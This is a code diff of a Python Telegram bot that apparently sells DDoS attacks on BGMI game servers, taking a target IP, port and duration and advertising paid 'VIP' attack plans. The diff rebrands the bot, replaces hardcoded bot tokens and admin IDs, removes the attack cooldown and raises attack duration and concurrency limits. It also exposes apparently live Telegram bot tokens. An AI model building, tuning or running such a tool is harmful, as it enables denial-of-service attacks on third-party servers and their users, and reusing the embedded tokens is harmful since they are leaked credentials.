@@ -66,10 +66,10 @@ import os
 # Join :- @DX4_CHEATS #from keep_alive import keep_alive
 # Join :- @DX4_CHEATS #keep_alive()
 # Join :- @DX4_CHEATS # insert your Telegram bot token here
-bot = telebot.TeleBot('7141965785:AAFRsCyY6y_iW4r_GMxkXdRclUGBVRF0fYc')
+bot = telebot.TeleBot('7357287054:AAF5FdD2j9DakQp81-blBWixoTfONIG7yxE')
 
 # Join :- @DX4_CHEATS # Admin user IDs
-admin_id = ["1470983554","1908095816","1537783826"]
+admin_id = ["6161481092"]
 
 # Join :- @DX4_CHEATS # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -485,12 +485,12 @@ def handle_bgmi(message):
     if user_id in allowed_user_ids:
         # Join :- @DX4_CHEATS # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Join :- @DX4_CHEATS # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
+            # Join :- @OPENLIONBACK # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                 response = "You Are On Cooldown . Please Wait 2min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
-            # Join :- @DX4_CHEATS # Update the last time the user ran the command
+            # Join :- @OPENLIONBACK # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
@@ -498,7 +498,7 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Join :- @DX4_CHEATS # Convert time to integer
             time = int(command[3])  # Join :- @DX4_CHEATS # Convert port to integer
-            if time > 240:
+            if time > 280:
                 response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
@@ -548,7 +548,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-By @DX4_CHEATS
+By @OPENLIONBACK
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -565,7 +565,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- By @DX4_CHEATS'''
+✅Join :- By @OPENLIONBACK'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -584,9 +584,9 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
+-> Attack Time : 280 (S)
+> After Attack Limit : 0 SEC
+-> Concurrents Attack : 8
 
 Pr-ice List💸 :
 Day-->100 Rs
